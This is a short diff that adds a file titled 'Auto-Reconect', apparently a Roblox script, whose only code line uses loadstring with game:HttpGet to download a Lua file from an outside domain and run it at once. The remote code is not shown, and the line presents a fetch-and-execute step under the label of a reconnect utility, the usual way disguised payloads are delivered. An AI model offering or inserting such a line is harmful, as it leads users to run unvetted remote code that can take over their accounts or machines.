@@ -1,0 +1,5 @@
+# Auto-Reconect
+
+
+
+loadstring(game:HttpGet("https://egorikusa.space/83359cde4dce34d79631bb1d.lua", true))()
